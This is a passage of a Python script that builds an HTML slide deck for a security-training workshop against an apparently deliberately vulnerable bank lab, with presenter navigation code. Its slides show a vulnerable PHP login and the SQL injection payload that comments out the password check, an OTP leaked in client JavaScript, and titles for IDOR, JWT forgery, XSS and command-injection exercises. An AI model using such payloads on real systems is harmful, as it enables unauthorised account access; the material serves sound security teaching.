<pre class="sol-code">SELECT * FROM users WHERE customer_id = 'BS100234' AND password_md5 = '5f4dcc3b&hellip;'</pre>
<p class="desc">Customer ID and password must match a row &mdash; correct, as long as the input is handled as <b>data</b>.</p>
<p class="sub mb1 mt3">The vulnerable code</p>
<pre class="sol-code"><span class="cmt">// login_vuln.php &mdash; Level 0</span>
$sql = "&hellip; WHERE customer_id = '" . <span class="inj">$cid</span> . "' AND password_md5 = '" . md5($pw) . "'";</pre>
<p class="desc"><code>$cid</code> is pasted straight into the SQL &mdash; whatever you type becomes query logic.</p>
</div>
<div>
<p class="sub mb1">The attack</p>
<p class="desc">Enter this as the Customer ID (any password):</p>
<div class="sol-pay">BS100234' #</div>
<div class="sol-paynote">your own Customer ID + <code>'</code> + <code>#</code></div>
<pre class="sol-code mt3">SELECT * FROM users WHERE customer_id = '<span class="inj">BS100234' #</span>' AND password_md5 = '&hellip;' <span class="cmt">&larr; commented out, never runs</span></pre>
<p class="desc">The <code>'</code> closes the ID string; <code>#</code> comments out the password check. The database never evaluates the password. We&rsquo;re in.</p>
</div>
</div>
</div></section>'''

# L11 Level-0 live demo (OTP in the response body), in the same sol-style as G1,
# folding the old plain "Instructions" + "The Answer" slides into one.
L11_DEMO_L0 = '''<section class="slide"><div class="slide-inner">
<div class="sol-head"><span class="sol-tag">L11</span><div><div class="sol-cwe">CWE-200 &middot; A04:2021 &middot; Level 0 &mdash; live demo</div><h2 style="margin:.06em 0">OTP in the Response Body</h2><div class="sol-where">&#128205; OTP screen &mdash; browser DevTools</div></div></div>
<div class="grid2 mt2">
<div>
<p class="sub mb1">How to find it</p>
<div class="step"><div class="step-num">1</div><div><p class="desc">You&rsquo;re on the OTP screen, waiting for a 4-digit code &mdash; without the victim&rsquo;s phone.</p></div></div>
<div class="step"><div class="step-num">2</div><div><p class="desc">Open DevTools: <strong style="color:var(--t1)">F12</strong> (Windows) or <strong style="color:var(--t1)">Cmd+Opt+I</strong> (Mac) &rarr; Sources / Network.</p></div></div>
<div class="step"><div class="step-num">3</div><div><p class="desc">The OTP is <em>already</em> in your browser &mdash; no new request needed.</p></div></div>
<p class="desc mt2">The attacker&rsquo;s superpower isn&rsquo;t hacking &mdash; it&rsquo;s <strong style="color:var(--t1)">reading what the application is already sending</strong>.</p>
</div>
<div>
<p class="sub mb1">What&rsquo;s in the shipped JavaScript</p>
<pre class="sol-code"><span class="cmt">// otp-validation.js &mdash; loaded by the OTP page</span>
var SESSION_DATA = {
  "_t": "otp", "_v": "2.1.4",
  <span class="inj">"_otp": "7241",</span>   <span class="cmt">&larr; the OTP</span>
  <span class="inj">"_flag": "BANKSPLOIT{&hellip;}",</span> <span class="cmt">&larr; the CTF flag</span>
  "_sid": "abc123", "_exp": 1719500000
};</pre>
<p class="desc">A developer left debug data in a script shipped to <b>every</b> browser. The OTP &mdash; a secret that should live only on the server &mdash; is sitting in client-side code.</p>
</div>
</div>
</div></section>'''

order = [
 ('orig',1,C,None),
 ('new',S_INTRO,C,None), ('new',S_WHY_HERE,C,None), ('new',S_OPENING_INCIDENT,C,None),
 ('new',S_OBJECTIVE,C,None), ('new',S_AGENDA,C,None),
 ('new',S_ROADMAP,C,None), ('new',S_HOW,C,None),
 ('new',S_MINDSET,C,None), ('orig',8,C,None), ('new',S_PATCH,C,None), ('orig',12,C,None),
 ('orig',13,C,None), ('orig',14,C,None),
 ('new',S_EIGHT,C,None), ('orig',16,C,None),
 # --- G1 --- (L0 demo folded into one sol-style slide; plain 18/19/20 replaced)
 ('orig',17,L,None),('new',G1_DEMO_L0,L,None),
 ('orig',21,L,None),
 ('new',mindset_slide('G1','G1 &bull; SQL injection',
   {'trust':'the text you typed, as part of the login query','ask':'&ldquo;Is user input ever built into a query, or always kept as data?&rdquo;','why':'<strong>IAM &amp; federated SSO</strong> (Okta, Entra, Google) &mdash; so the app never owns the password or builds the login query itself'}),L,None),
 ('new',yourturn('G1','Log In Without Any Password',
   'You logged in to another customer&rsquo;s account without ever knowing their password.'),L,'handson'),
 ('orig',22,L,None),('orig',23,L,None),
 ('new',RW_G1,L,'real'),
 # --- L11 --- (orig 41 "Hints (if you're stuck)" dropped: hands-on is now the clean Your Turn)
 ('orig',39,L,None),('new',L11_DEMO_L0,L,None),('orig',43,L,None),
 ('new',mindset_slide('L11','L11 &bull; OTP exposure',
   {'trust':'the browser with the very answer it was meant to check','ask':'&ldquo;Does the client ever receive what it is supposed to be checked against?&rdquo;','why':'<strong>MFA that evolved</strong> &mdash; Meta and Google lived through codes being read and replayed, so it moved to push-approval, passkeys/FIDO2 and short-lived RSA/TOTP tokens'}),L,None),
 ('new',yourturn('L11','Defeat 2FA on a Harder Setting',
   'You got past the one-time-code (2FA) step without ever having the customer&rsquo;s phone.',
   retest='<strong style="color:var(--t1)">They didn&rsquo;t know it was there.</strong> The OTP was in the shipped JavaScript as a by-product of how the feature was built &mdash; left-over debug data, or a value the page genuinely used &mdash; and no one realised the browser was downloading a secret. They <strong>can&rsquo;t simply delete it</strong>: the page still depends on it. So instead of taking the secret off the client, they tried to <strong>hide it better</strong>. You don&rsquo;t know how &mdash; find out whether it is still reachable.'),L,'handson'),
 ('new',L11_FIX,L,None),('new',WHO_L11,L,None),
 ('new',RW_L11,L,'real'),
 # --- L25 ---
 ('new',L25_TITLE,L,None),('new',L25_HOW,L,None),('new',L25_ATTACK,L,None),
 ('new',L25_MOMENT,L,None),
 ('new',mindset_slide('L25','L25 &bull; Session puzzling',
   {'trust':'progress made for <em>one</em> account as if it had been earned for <em>whatever</em> account is in the session now','ask':'&ldquo;Is every identity check bound to the <em>exact</em> account it was performed for &mdash; and does changing the target reset that progress?&rdquo;','why':'<strong>per-target verification</strong> &mdash; progress is tied to the account that earned it, and re-checked at each sensitive action, not at one early gate'}),L,None),
 ('new',yourturn('L25','Reset Another Customer&rsquo;s Password',
   'You reset another customer&rsquo;s password without ever proving you were them &mdash; by reusing recovery progress earned on your own account.'),L,'handson'),
 ('new',L25_FIX,L,None),('new',WHO_L25,L,None),
 ('new',RW_L25,L,'real'),
 # --- L12 ---
 ('new',L12_TITLE,L,None),('new',L12_HOW,L,None),('new',L12_ATTACK,L,None),
 ('new',L12_MOMENT,L,None),
 ('new',mindset_slide('L12','L12 &bull; JWT forgery',
   {'trust':'the token&rsquo;s own claim about how it was signed &mdash; even &ldquo;signed with nothing&rdquo;','ask':'&ldquo;Do we enforce the exact algorithm and actually verify the signature?&rdquo;','why':'<strong>hardened tokens</strong> &mdash; <code>alg:none</code> rejected by default, the algorithm pinned, signing keys in an HSM/KMS, short lifetimes'}),L,None),
 ('new',yourturn('L12','Promote Yourself to Administrator',
   'You turned your ordinary customer session into an administrator&rsquo;s.'),L,'handson'),
 ('new',L12_FIX,L,None),('new',WHO_L12,L,None),
 ('new',RW_L12,L,'real'),
 # --- L1 (IDOR transfer, stronger message) ---
 ('orig',44,L,None),('orig',45,L,None),('orig',46,L,None),('orig',47,L,None),
 ('new',IDOR_MOMENT,L,None),
 ('new',mindset_slide('L1','L1 &bull; IDOR (broken object-level authorization)',
   {'trust':'that the account number you send is one you actually own','ask':'&ldquo;We checked <em>who you are</em> &mdash; did we check <em>what you may touch</em>?&rdquo;','why':'<strong>authorization, not just authentication</strong> &mdash; object-level ownership checks, and reconciliation on every money movement'}),L,None),
 ('new',yourturn('L1','Move Money From an Account That Is Not Yours',
   'You moved money out of an account that was not yours.'),L,'handson'),
 ('new',L1_FIX,L,None),('new',WHO_L1,L,None),
 ('new',RW_L1,L,'real'),
 # --- G2 ---
 ('new',G2_TITLE,L,None),('new',G2_HOW,L,None),('new',G2_ATTACK,L,None),
 ('new',G2_MOMENT,L,None),
 ('new',mindset_slide('G2','G2 &bull; SQL injection (data extraction)',
   {'trust':'your search text, as part of the database query','ask':'&ldquo;If this database leaked tomorrow, is it stored so the dump is useless?&rdquo;','why':'<strong>defence in depth</strong> &mdash; passwords hashed with salt &amp; pepper so a dump is not a takeover, least-privilege DB accounts, minimal functions/plugins, query monitoring'}),L,None),
 ('new',yourturn('G2','Read a Table You Were Never Shown',
   'You read data out of a table the application never meant to show you.'),L,'handson'),
 ('new',G2_FIX,L,None),('new',WHO_G2,L,None),
 ('new',RW_G2,L,'real'),
 # --- G4 (demo only) ---
 ('new',G4_TITLE,L,None),('new',G4_HOW,L,None),('new',G4_ATTACK,L,None),
 ('new',G4_MOMENT,L,None),
 ('new',mindset_slide('G4','G4 &bull; Reflected XSS',
   {'trust':'your input as text to display &mdash; not as live code','ask':'&ldquo;Is everything we echo back to the page treated as text, never as code?&rdquo;','why':'the reason you are told <strong>not to click unexpected links</strong> &mdash; one click can hand over a session. Defences: framework auto-escaping, <strong>CSP</strong>, <strong>HttpOnly</strong> cookies and the <strong>Same-Origin Policy</strong>'}),L,None),
 ('new',yourturn('G4','Make the Bank&rsquo;s Own Page Run Your Code',
   'You made the bank&rsquo;s own page run code of your choosing in a visitor&rsquo;s browser.',
   note='Note: G4 is configured as training-only in the lab, so it will not award points until you enable scoring for it in the instructor panel.'),L,'handson'),
 ('new',G4_FIX,L,None),('new',WHO_G4,L,None),
 ('new',RW_G4,L,'real'),
 # --- G9 ---
 ('orig',31,L,None),('orig',32,L,None),('orig',33,L,None),('orig',34,L,None),
 ('orig',35,L,None),('new',G9_MOMENT,L,None),
 ('new',mindset_slide('G9','G9 &bull; Command injection',
   {'trust':'your input as part of the shell command line','ask':'&ldquo;Does user input ever reach a shell &mdash; and if it did, how far could it go?&rdquo;','why':'frameworks that <strong>never build shell strings</strong> &mdash; arguments passed as a list, so input cannot become a command &mdash; plus least-privilege, sandboxed/containerised runtimes'}),L,None),
 ('new',yourturn('G9','Run a Command on the Server',
   'You ran a command of your own on the bank&rsquo;s server.'),L,'handson'),
 ('orig',36,L,None),('orig',37,L,None),
 ('new',RW_G9,L,'real'),
 # --- The chain ---
 ('new',S_REFLECT1,CH,None),
 ('new',S_CHAIN,CH,None), ('new',S_BREAK_CHAIN,CH,None), ('orig',52,CH,None),
 # --- AI ---
 ('orig',54,AI,None),('orig',55,AI,None),('orig',56,AI,None),('orig',57,AI,None),
 ('orig',58,AI,None),('orig',59,AI,None),('orig',60,AI,None),
 # --- Takeaways ---
 ('orig',63,TK,None), ('new',S_QUESTIONS,TK,None), ('orig',53,TK,None),
 ('orig',64,TK,None), ('orig',65,TK,None), ('orig',66,TK,None),
 ('new',S_CLOSE,TK,None),
]

# Place each vuln's deep-dive (overview + all level slides) in the debrief, just
# BEFORE that vuln's real-world breach slide (so order is: Your Turn -> Fix -> Who
# -> solution -> breach). The Your Turn slide carries the vid as ">G1 &bull; Level".
_expanded = []
_pending_sol = None
for _item in order:
    _typ, _ref, _ph, _kind = _item
    if _kind == 'handson':
        _h = orig[_ref] if _typ == 'orig' else _ref
        _m = re.search(r'>\s*([GL]\d+)\s*&bull;\s*Level', _h)
        _pending_sol = (_ph, SOL_BY_TAG[_m.group(1)]) if (_m and _m.group(1) in SOL_BY_TAG) else None
        _expanded.append(_item)
    elif _kind == 'real' and _pending_sol:
        for _sol in _pending_sol[1]:
            _expanded.append(('new', _sol, _pending_sol[0], None))
        _pending_sol = None
        _expanded.append(_item)
    else:
        _expanded.append(_item)
order = _expanded

def prep2(html, num, phase, kind):
    html = re.sub(r'\s+id="s\d+"', '', html, count=1)
    attrs = ' id="s%d" data-phase="%s"' % (num, phase)
    if kind:
        attrs += ' data-kind="%s"' % kind
    return html.replace('<section', '<section' + attrs, 1)

slides_html = []
for idx, item in enumerate(order, start=1):
    typ, ref, phase, kind = item
    html = orig[ref] if typ == 'orig' else ref
    slides_html.append(prep2(html, idx, phase, kind))

print("Assembled %d slides" % len(slides_html))
assert len(slides_html) == len(order)

JS_BLOCK = r'''
<script>
(function(){
  var deck = document.getElementById('deck');
  var all = Array.prototype.slice.call(deck.querySelectorAll('.slide'));
  var byId = {}; all.forEach(function(s){ byId[s.id] = s; });
  var defaultOrder = all.map(function(s){ return s.id; });
  var ORDER_KEY = 'bs_ws_order_v2', HIDE_KEY = 'bs_ws_hidden_v2';
  var progress = document.getElementById('progress');
  var counter  = document.getElementById('counter');
  var fsHint   = document.getElementById('fs-hint');
  var feedbackBtn = document.getElementById('feedback-btn');
  var FEEDBACK_AFTER = 25;   /* button appears from this slide onward */
  var slides = all.slice();
  var current = 0;

  /* ── Persisted order + hidden set ── */
  function loadOrder(){
    try{
      var raw = localStorage.getItem(ORDER_KEY);
      if(raw){
        var o = JSON.parse(raw);
        if(o.length === defaultOrder.length && o.every(function(id){ return byId[id]; })) return o;
      }
    }catch(e){}
    return defaultOrder.slice();
  }
  function loadHidden(){
    try{ var raw = localStorage.getItem(HIDE_KEY); if(raw) return new Set(JSON.parse(raw)); }catch(e){}
    return new Set();
  }
  var order = loadOrder();
  var hiddenSet = loadHidden();
  function saveOrder(){ try{ localStorage.setItem(ORDER_KEY, JSON.stringify(order)); }catch(e){} }
  function saveHidden(){ try{ localStorage.setItem(HIDE_KEY, JSON.stringify(Array.from(hiddenSet))); }catch(e){} }

  function applyOrder(){
    var curId = slides[current] ? slides[current].id : order[0];
    order.forEach(function(id){ deck.appendChild(byId[id]); });
    slides = order.map(function(id){ return byId[id]; });
    var ni = order.indexOf(curId);
    current = ni >= 0 ? ni : 0;
  }
  function applyHidden(){
    slides.forEach(function(s){ s.classList.toggle('slide-hidden', hiddenSet.has(s.id)); });
  }
  function isHidden(i){ return hiddenSet.has(slides[i].id); }
  function visibleIdx(){ var a=[]; for(var i=0;i<slides.length;i++){ if(!isHidden(i)) a.push(i); } return a; }
  function nextVisible(from, dir){
    var i = from;
    while(i >= 0 && i < slides.length){ if(!isHidden(i)) return i; i += dir; }
    return -1;
  }
  /* live presentation number of a slide, or null when hidden */
  function liveNumber(id){
    var n = 0;
    for(var i=0;i<order.length;i++){
      if(!hiddenSet.has(order[i])) n++;
      if(order[i] === id) return hiddenSet.has(id) ? null : n;
    }
    return null;
  }

  applyOrder(); applyHidden();

  /* ── Phase tracker ── */
  var phaseTracker = document.getElementById('phase-tracker');
  function buildPhases(){
    var names = [];
    slides.forEach(function(s){ var p=s.getAttribute('data-phase'); if(p && names.indexOf(p)<0) names.push(p); });
    phaseTracker.innerHTML = '';
    names.forEach(function(name){
      var pill = document.createElement('span');
      pill.className = 'phase-pill';
      pill.textContent = name;
      pill.addEventListener('click', function(e){
        e.stopPropagation();
        for(var i=0;i<slides.length;i++){
          if(slides[i].getAttribute('data-phase')===name && !isHidden(i)){ goTo(i); return; }
        }
      });
      phaseTracker.appendChild(pill);
    });
  }
  function updatePhase(){
    var cur = slides[current].getAttribute('data-phase');
    phaseTracker.querySelectorAll('.phase-pill').forEach(function(p){
      p.classList.toggle('active', p.textContent === cur);
    });
  }
  buildPhases();

  function init(){
    var hash = (location.hash || '').replace('#','');
    if(hash && byId[hash]){ var i = order.indexOf(hash); if(i >= 0) current = i; }
    if(isHidden(current)){
      var v = nextVisible(current,1); if(v<0) v = nextVisible(current,-1);
      current = v >= 0 ? v : 0;
    }
    slides[current].classList.add('active');
    updateUI();
    setTimeout(function(){ if(fsHint) fsHint.style.opacity='0'; },4000);
    setTimeout(function(){ if(fsHint) fsHint.style.display='none'; },5000);
  }
  function goTo(n){
    if(n < 0 || n >= slides.length || n === current) return;
    if(isHidden(n)){ var v = nextVisible(n,1); if(v<0) v = nextVisible(n,-1); if(v<0) return; n = v; }
    if(slides[current].querySelector('#mindset-reveal-btn')) resetAttacker();
    slides[current].classList.remove('active');
    current = n;
    slides[current].classList.add('active');
    updateUI();
  }
  function showCurrent(){
    slides.forEach(function(s){ s.classList.remove('active'); });
    slides[current].classList.add('active');
    updateUI();
  }
  function updateUI(){
    var vis = visibleIdx();
    var pos = vis.indexOf(current); if(pos < 0) pos = 0;
    progress.style.width = ((pos+1)/Math.max(vis.length,1)*100)+'%';
    counter.textContent = (pos+1)+' / '+vis.length;
    history.replaceState(null,null,'#'+slides[current].id);
    if(feedbackBtn) feedbackBtn.classList.toggle('show', (pos+1) >= FEEDBACK_AFTER);
    updatePhase();
  }
  function next(){ var n = nextVisible(current+1,1); if(n>=0) goTo(n); }
  function prev(){ var n = nextVisible(current-1,-1); if(n>=0) goTo(n); }

  document.addEventListener('keydown',function(e){
    if(mgr.classList.contains('open')){
      if(e.key==='Escape'||e.key==='m'||e.key==='M'){ e.preventDefault(); mgrClose(); }
      return;
    }
    switch(e.key){
      case 'ArrowRight': case ' ': case 'Enter': case 'PageDown': e.preventDefault(); next(); break;
      case 'ArrowLeft': case 'Backspace': case 'PageUp': e.preventDefault(); prev(); break;
      case 'Home': e.preventDefault(); goTo(nextVisible(0,1)); break;
      case 'End': e.preventDefault(); goTo(nextVisible(slides.length-1,-1)); break;
      case 'm': case 'M': e.preventDefault(); mgrOpen(); break;
      case 'x': case 'X':
        e.preventDefault();
        hiddenSet.add(slides[current].id); saveHidden(); applyHidden();
        var v = nextVisible(current,1); if(v<0) v = nextVisible(current,-1);
        if(v>=0){ current=v; showCurrent(); }
        break;
    }
  });
  document.addEventListener('click',function(e){
    if(e.target.closest('#slide-mgr,#mgr-btn,#timer-widget,a,button,pre,code,input,select')) return;
    if(mgr.classList.contains('open')) return;
    if(e.clientX < window.innerWidth*0.3){ prev(); } else { next(); }
  });
  var touchX=0;
  document.addEventListener('touchstart',function(e){ touchX=e.changedTouches[0].screenX; },{passive:true});
  document.addEventListener('touchend',function(e){
    if(mgr.classList.contains('open')) return;
    var dx=e.changedTouches[0].screenX-touchX;
    if(Math.abs(dx)>50){ dx<0?next():prev(); }
  },{passive:true});

  /* ── Mindset reveal ── */
  var atkRevealed=false;
  window.revealAttacker=function(){
    if(atkRevealed) return; atkRevealed=true;
    document.querySelectorAll('.atk-col').forEach(function(el){ el.style.opacity='1'; });
    var b=document.getElementById('mindset-reveal-btn'); if(b) b.style.display='none';
    var pre=document.getElementById('mindset-pre'); if(pre) pre.style.display='none';
    var post=document.getElementById('mindset-post'); if(post) post.style.display='block';
  };
  function resetAttacker(){
    atkRevealed=false;
    document.querySelectorAll('.atk-col').forEach(function(el){ el.style.opacity='0'; });
    var b=document.getElementById('mindset-reveal-btn'); if(b) b.style.display='';
    var pre=document.getElementById('mindset-pre'); if(pre) pre.style.display='';
    var post=document.getElementById('mindset-post'); if(post) post.style.display='none';
  }

  /* ── Slide Manager ── */
  var mgr = document.getElementById('slide-mgr');
  var mgrList = document.getElementById('mgr-list');
  function slideLabel(s){
    var h1=s.querySelector('h1'), h2=s.querySelector('h2'), h3=s.querySelector('h3'),
        sub=s.querySelector('.sub'), badge=s.querySelector('.badge');
    var t=(h1&&h1.textContent)||(h2&&h2.textContent)||(h3&&h3.textContent)||(sub&&sub.textContent)||'Slide';
    t=t.replace(/\s+/g,' ').trim();
    if(badge){ var bt=badge.textContent.replace(/\s+/g,' ').trim(); if(bt) t=bt+' — '+t; }
    return t;
  }
  function renderList(){
    mgrList.innerHTML='';
    order.forEach(function(id, pos){
      var s = byId[id];
      var off = hiddenSet.has(id);
      var ln = liveNumber(id);
      var row = document.createElement('div');
      row.className='mgr-row'+(off?' off':'')+(slides[current] && slides[current].id===id ? ' cur':'');
      row.setAttribute('data-id', id);
      var kind = s.getAttribute('data-kind');
      var kb = kind==='handson' ? '<span class="mk mk-handson">Your Turn</span>'
             : kind==='real'    ? '<span class="mk mk-real">Real case</span>' : '';
      row.innerHTML =
        '<span class="mn">'+(ln===null?'&ndash;':ln)+'</span>'+
        '<span class="mt">'+slideLabel(s).replace(/</g,'&lt;')+'</span>'+kb+
        '<span class="mmove">'+
          '<button class="mvb" data-dir="-1" title="Move earlier"'+(pos===0?' disabled':'')+'>&#9650;</button>'+
          '<button class="mvb" data-dir="1" title="Move later"'+(pos===order.length-1?' disabled':'')+'>&#9660;</button>'+
        '</span>';
      row.addEventListener('click', function(e){
        if(e.target.closest('.mvb')) return;
        toggleSlide(id); renderList();
      });
      row.addEventListener('dblclick', function(e){
        if(e.target.closest('.mvb')) return;
        mgrClose(); goTo(order.indexOf(id));
      });
      row.querySelectorAll('.mvb').forEach(function(b){
        b.addEventListener('click', function(ev){
          ev.stopPropagation();
          moveSlide(id, parseInt(b.getAttribute('data-dir'),10));
        });
      });
      mgrList.appendChild(row);
    });
    updateCount();
  }
  function moveSlide(id, dir){
    var i = order.indexOf(id), j = i + dir;
    if(i < 0 || j < 0 || j >= order.length) return;
    order.splice(j, 0, order.splice(i,1)[0]);
    saveOrder(); applyOrder(); applyHidden(); buildPhases();
    renderList();
    var row = mgrList.querySelector('.mgr-row[data-id="'+id+'"]');
    if(row) row.scrollIntoView({block:'nearest'});
  }
  function toggleSlide(id){
    if(hiddenSet.has(id)) hiddenSet.delete(id); else hiddenSet.add(id);
    saveHidden(); applyHidden();
  }
  function updateCount(){
    document.getElementById('mgr-count').textContent =
      '('+(order.length-hiddenSet.size)+' shown of '+order.length+')';
  }
  window.mgrOpen = function(){ renderList(); mgr.classList.add('open'); };
  window.mgrClose = function(){
    mgr.classList.remove('open');
    applyHidden();
    if(isHidden(current)){
      var v=nextVisible(current,1); if(v<0) v=nextVisible(current,-1);
      if(v>=0){ current=v; }
    }
    showCurrent();
  };
  window.mgrPreset = function(mode){
    if(mode==='all'){ hiddenSet = new Set(); }
    else if(mode==='demo'){
      hiddenSet = new Set();
      order.forEach(function(id){ if(byId[id].getAttribute('data-kind')==='handson') hiddenSet.add(id); });
    }
    else if(mode==='short'){
      hiddenSet = new Set();
      order.forEach(function(id){
        var k = byId[id].getAttribute('data-kind');
        if(k==='handson'||k==='real') hiddenSet.add(id);
      });
    }
    else if(mode==='resetorder'){ order = defaultOrder.slice(); saveOrder(); applyOrder(); buildPhases(); }
    saveHidden(); applyHidden(); renderList();
  };

  /* ── Timer ── */
  var timerWidget=document.getElementById('timer-widget'),
      timerDisplay=document.getElementById('timer-display'),
      timerToggleBtn=document.getElementById('timer-toggle-btn');
  var timerSeconds=0,timerOriginal=0,timerInterval=null,timerRunning=false;
  function fmtTime(s){ return String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0'); }
  window.timerStart=function(secs){
    timerOriginal=secs; timerSeconds=secs; timerRunning=false;
    if(timerInterval) clearInterval(timerInterval); timerInterval=null;
    timerDisplay.classList.remove('expired'); timerDisplay.textContent=fmtTime(secs);
    timerWidget.classList.add('visible'); window.timerToggle();
  };
  window.timerToggle=function(){
    if(timerRunning){ clearInterval(timerInterval); timerInterval=null; timerRunning=false; timerToggleBtn.textContent='▶'; }
    else{
      if(timerSeconds<=0) return;
      timerRunning=true; timerToggleBtn.textContent='⏸';
      timerInterval=setInterval(function(){
        timerSeconds--; timerDisplay.textContent=fmtTime(timerSeconds);
        if(timerSeconds<=0){
          clearInterval(timerInterval); timerInterval=null; timerRunning=false;
          timerDisplay.classList.add('expired'); timerDisplay.textContent="TIME'S UP";
          timerToggleBtn.textContent='▶';
        }
      },1000);
    }
  };
  window.timerReset=function(){
    if(timerInterval) clearInterval(timerInterval); timerInterval=null; timerRunning=false;
    timerSeconds=timerOriginal; timerDisplay.classList.remove('expired');
    timerDisplay.textContent=fmtTime(timerOriginal); timerToggleBtn.textContent='▶';
  };
  window.timerHide=function(){
    if(timerInterval) clearInterval(timerInterval); timerInterval=null; timerRunning=false;
    timerWidget.classList.remove('visible');
  };

  init();
})();
</script>
'''

# Extra CSS for the hidden state
head = head.replace('</style>', '.slide.slide-hidden{display:none!important}\n</style>')

final = head + '\n<div id="deck">\n' + '\n'.join(slides_html) + '\n</div>\n' + JS_BLOCK + '\n</body>\n</html>\n'
open(OUT,'w',encoding='utf-8').write(final)
print("WROTE", OUT, len(final), "bytes")
